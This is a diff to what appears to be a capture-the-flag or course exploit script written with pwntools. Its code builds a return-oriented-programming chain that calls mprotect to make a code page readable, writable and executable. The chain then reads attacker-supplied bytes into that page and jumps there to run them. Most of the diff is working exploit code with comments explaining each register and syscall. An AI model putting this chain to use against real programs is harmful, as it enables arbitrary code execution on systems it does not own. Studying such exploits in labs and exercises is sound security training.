@@ -82,6 +82,7 @@ def code_bytes_find(target_asm):
         pass
     return pos
 
+
 def get_rop_addr():
     global pop_rax_ret, pop_rdi_ret, syscall_ret, pop_rsi_ret, pop_rdx_ret
 
@@ -106,8 +107,10 @@ def task1_byte():
 
     return send_line
 
-def mprotect_byte():
+
+def mprotect_read_byte():
     global start_code_address, pop_rax_ret, pop_rdi_ret, syscall_ret, pop_rsi_ret, pop_rdx_ret
+
     mprotect_address = start_code_address & ~(0xfff)  # use the align address
     print("start_code_address: ", hex(start_code_address))
     print("mprotect_address: ", hex(mprotect_address))
@@ -117,63 +120,67 @@ def mprotect_byte():
     # ropshell will clean the register before executing
 
     send_line = flat(
-        # al is rax's LSB 8 bits, 0xa is 10, mprotect syscall number
-        # rax to place syscall number
+        # mprotect, syscall number 10
+        # rax: syscall number - 10
+        # rdi: page start - mprotect_address 
+        # rsi: page len - 40960
+        # rdx: open mode -> read(0x1), write(0x2), exec(0x4) -(all or)-> 0x7
         pop_rax_ret,
         10,
-        # rdi - page start
         pop_rdi_ret,
         mprotect_address,
-        # rsi - page len
         pop_rsi_ret,
         40960,
-        # rdx - dl is LSB 8 bits, open mode -> read(0x1), write(0x2), exec(0x4) -(all or)-> 0x7
         pop_rdx_ret,
         7,
         syscall_ret,
 
-        # write syscall
+        # write, syscall number 1
+        # rax: syscall number - 1
+        # rdi: fd (stdout) - 1
+        # rsi: buf addr - start_code_address, write start from codeint
+        # rdx: write len
         pop_rax_ret,
         1,
-        # fd (stdout)
         pop_rdi_ret,
         1,
-        # buf addr
         pop_rsi_ret,
         start_code_address,
-        # len
         pop_rdx_ret,
         50,
         syscall_ret,
 
-        # read user input
-        # read syscall
+        # read, syscall number 0
+        # rax: syscall number - 0
+        # rdi: fd (stdin) - 0
+        # rsi: buf addr - start_code_address, read into codeint start
+        # rdx: read len - 4096
         pop_rax_ret,
         0,
-        # fd (stdin)
         pop_rdi_ret,
         0,
-        # buf addr
         pop_rsi_ret,
         start_code_address,
-        # len
         pop_rdx_ret,
         4096,
         syscall_ret,
-        # write syscall
+
+        # write, syscall number 1
+        # rax: syscall number - 1
+        # rdi: fd (stdout) - 1
+        # rsi: buf addr - start_code_address, write start from codeint
+        # rdx: write len
         pop_rax_ret,
         1,
-        # fd (stdout)
         pop_rdi_ret,
         1,
-        # buf addr
         pop_rsi_ret,
         start_code_address,
-        # len
         pop_rdx_ret,
         50,
         syscall_ret,
-        # go to execute the code here
+
+        # go to execute the code here after ret from write / read
         start_code_address,
     )
 
@@ -206,21 +213,21 @@ if __name__ == '__main__':
     gen_random_code_bytes()
     get_rop_addr()
 
-    send_line = task1_byte()
-    # [first send]
-    send_line = mprotect_byte()
+    # send_line = task1_byte()
+    # [first send] -> mprotect & read from user input
+    send_line = mprotect_read_byte()
     # send_line += task1_byte()
     # print("send_line_1: ", send_line)
     
     r.send(send_line)
 
     # send shell code -> normal exit
-    # [second send] 
     print("bytes command received output: ", r.recvuntil("bytes command received.\n", drop=False).decode())
 
     # 1st write codeint output
     print(r.recv())
 
+    # [second send] -> input the asm we want to execute and it will be store into the start of codeint
     send_line_2 = task1_byte()
     print("send_line_2 to read: ", send_line_2)
     r.send(send_line_2)
